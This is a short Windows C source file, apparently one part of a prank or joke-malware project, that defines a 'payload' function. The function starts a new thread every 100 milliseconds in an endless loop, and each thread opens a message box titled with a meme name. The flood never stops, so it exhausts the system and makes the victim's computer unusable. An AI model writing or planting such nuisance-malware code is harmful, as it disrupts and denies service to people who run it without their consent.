#include "payloads.h"

#define PopUp_Delay 100
#define texts_count 4

DWORD WINAPI popup_messagebox(LPVOID argument);

const char* texts[] = { "1", "2", "3", "4" };

DWORD WINAPI payload_messageboxes(LPVOID argument)
{
	while(1)
	{
		CreateThread(NULL, NULL, popup_messagebox, NULL, NULL, NULL);
		Sleep(PopUp_Delay);
	}
}

DWORD WINAPI popup_messagebox(LPVOID argument)
{
	MessageBox(NULL, texts[rand() % texts_count], "蔡徐坤", NULL);
}
